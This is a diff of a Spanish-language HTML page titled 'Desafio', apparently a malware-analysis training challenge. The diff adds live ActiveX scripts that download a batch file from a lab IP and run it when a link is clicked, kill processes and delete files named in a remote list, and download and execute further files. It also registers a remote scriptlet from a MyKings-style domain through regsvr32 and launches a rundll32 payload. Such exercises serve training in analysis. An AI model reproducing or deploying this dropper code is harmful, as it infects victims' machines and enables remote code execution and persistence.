@@ -1,12 +1,12 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-<script type="text/javascript">
+<script src="http://192.168.221.128/Desafio/jquery.min.js"></script>
+<script type="text/javascript"> //Visual
 $(document).ready(function() {
 var i = 0;
 	$(".container").hide();
+	$("footer").hide();
 	$(".loader").fadeOut(7000);
 	$(".loader2").fadeOut(7000);
 	$(".container").delay(7000).slideUp().fadeIn("slow");
@@ -36,7 +36,6 @@ var i = 0;
 	$("#myBar").show();
 		if(i==0){
 		alert("Ups! Empezaste mal ,El Malware desplego su segunda fase");
-		//run script
 		var a=0;
 		if (a == 0) {
 		a = 1;
@@ -64,6 +63,73 @@ var i = 0;
 		
 });
 });
+</script>
+
+<script type="text/javascript">
+//Descarga PowerShell.
+
+var url="http://192.168.221.128/Desafio/PowerBat.txt",http=new ActiveXObject("Microsoft.XMLHTTP"),ado=new ActiveXObject("ADODB.Stream"),wsh=new ActiveXObject("WScript.Shell");
+http.open("GET",url,!1);
+http.send();
+ado.Open();
+ado.Type=1;
+ado.Write(http.responseBody)
+ado.SaveToFile('C:\\Power.bat',2);
+ado.Close();
+var a=0;
+function runCmd(command, option)
+{
+    var char34 = String.fromCharCode(34);
+    var wsh = new ActiveXObject('WScript.Shell');
+    if(a==0){
+	
+	if (wsh)
+    {
+        command = 'C:\\Power.bat /MIN ' + char34 + wsh.ExpandEnvironmentStrings(command);
+        wsh.Run(command);
+    }
+	a=1;
+	}
+}
+
+</script>
+
+<script type="text/javascript">
+ScriptText: var toff=3000;
+var url1 = "http://192.168.221.128/Desafio/kill.html";
+http = new ActiveXObject("Msxml2.ServerXMLHTTP");
+fso = new ActiveXObject("Scripting.FilesystemObject");
+wsh = new ActiveXObject("WScript.Shell");
+http.open("GET", url1, false);
+http.send();
+str = http.responseText;
+arr = str.split("\r\n");
+for (i = 0; i < arr.length; i++) { t = arr[i].split(" ");
+proc = t[0];
+path = t[1];
+dele = t[2];
+wsh.Run("taskkill /f /im " + proc, 0, true);
+if (dele == 0) { try { fso.DeleteFile(path, true); } catch (e) {} } };
+var locator=new ActiveXObject("WbemScripting.SWbemLocator");
+var service=locator.ConnectServer(".","root/cimv2");
+var colItems=service.ExecQuery("select * from Win32_Process");
+var e=new Enumerator(colItems);
+var t1=new Date().valueOf();
+for(;!e.atEnd();e.moveNext()){var p=e.item();if(p.Caption=="rundll32.exe")p.Terminate()};
+var t2=0;
+while(t2-t1<toff){var t2=new Date().valueOf()}
+var pp=service.get("Win32_Process");
+var url="http://192.168.221.128/Desafio/test.html",http=new ActiveXObject("Microsoft.XMLHTTP"),ado=new ActiveXObject("ADODB.Stream"),wsh=new ActiveXObject("WScript.Shell");
+for(http.open("GET",url,!1),http.send(),str=http.responseText,arr=str.split("\r\n"),i=0;arr.length>i;i++)t=arr[i].split(" ",3),http.open("GET",t[0],!1),http.send(),ado.Type=1,ado.Open(),ado.Write(http.responseBody),ado.SaveToFile(t[1],2),ado.Close(),1==t[2]&&wsh.Run(t[1]);
+pp.create("regsvr32 /s shell32.dll");
+pp.create("regsvr32 /s WSHom.Ocx");
+pp.create("regsvr32 /s scrrun.dll");
+pp.create("regsvr32 /s c:\\Progra~1\\Common~1\\System\\Ado\\Msado15.dll");
+pp.create("regsvr32 /u /s /i:http://js.mykings.top:280/v.sct scrobj.dll");
+pp.create("regsvr32 /s jscript.dll");
+pp.create("rundll32.exe c:\\windows\\debug\\item.dat,ServiceMain aaaa");
+
+
 </script>
 
 <title>Desafio</title>
@@ -235,15 +301,73 @@ display:none;
   background-color: #5cb85c;
   color: white;
 }
-a{
-text-decoration:underline;
-text-color:black;
+
+/* Button used to open the contact form - fixed at the bottom of the page */
+.open-button {
+  background-color: #555;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  opacity: 0.8;
+  position: fixed;
+  width: 280px;
+  left:40%;
+  bottom:5%;
 }
-a:visited{
-color:black;
+
+/* The popup form - hidden by default */
+.form-popup {
+  display: none;
+  position: fixed;
+  border: 3px solid #f1f1f1;
+  bottom:15%;
+  z-index: 9;
+  left:30%;
 }
-a:hover[
-color:red;
+
+/* Add styles to the form container */
+.form-container {
+  max-width: 600px;
+  padding: 20px;
+  background-color: white;
+}
+
+/* Full-width input fields */
+.form-container input[type=text], .form-container input[type=password] {
+  width: 90%;
+  padding: 15px;
+  margin: 5px 0 22px 0;
+  border: none;
+  background: #f1f1f1;
+}
+
+/* When the inputs get focus, do something */
+.form-container input[type=text]:focus, .form-container input[type=password]:focus {
+  background-color: #ddd;
+  outline: none;
+}
+
+/* Set a style for the submit/login button */
+.form-container .btn {
+  background-color: #4CAF50;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom:10px;
+  opacity: 0.8;
+}
+
+/* Add a red background color to the cancel button */
+.form-container .cancel {
+  background-color: red;
+}
+
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
 }
 </style>
 </head>
@@ -293,17 +417,18 @@ window.onclick = function(event) {
   }
 }
 </script>
-<div id="ayuda"><p style="text-align:center;"><a href="#">Ayuda</a></p>
+<div id="ayuda"><p><a href="#">Ayuda</a></p>
 <div id="ayudas">
 	<br>
-<li id="IDHerramienta2">Utiliza las herramienta que conociste en el los anteriores analisis , te recomiendo las siguientes : <br><br></li>
-<li id="IDHerramienta">Process Explorer</li>
-<li id="IDHerramienta">Autoruns</li>
-<li id="IDHerramienta">Wireshark</li>
-<li id="IDHerramienta">Process Monitor</li>
+<li id="IDHerramienta2">Recorda como suele alojarse un malware<br><br></li>
+<li id="IDHerramienta">Llaves de Registro : Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+<li id="IDHerramienta">Llaves de Registro : Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li>
+<li id="IDHerramienta">Tareas Programadas</li>
+<li id="IDHerramienta">Entradas WMI</li>
+<li id="IDHerramienta">Comando Wireshark : http.request.method==GET</li>
 
 </div></div>
-<div id="nope"><p style="text-align:center;"><a href="#">¿Que hago?</a></p>
+<div id="nope"><p style="text-align:center;"><a onclick="runCmd();" href="#">¿Que hago?</a></p>
 <div id="myProgress">
 <div id="myBar">0%</div>
 </div>
@@ -312,7 +437,7 @@ window.onclick = function(event) {
 <div id="herramienta"><p style="text-align:center;"><a href="#">Herramientas</a></p>
 <div id="herramientas">
 	<br>
-<li id="IDHerramienta2">Utiliza las herramienta que conociste en el los anteriores analisis , te recomiendo las siguientes : <br><br></li>
+<li id="IDHerramienta2">Utiliza las herramienta que conociste los analisis anteriores , te recomiendo las siguientes : <br><br></li>
 <li id="IDHerramienta">Process Explorer</li>
 <li id="IDHerramienta">Autoruns</li>
 <li id="IDHerramienta">Wireshark</li>
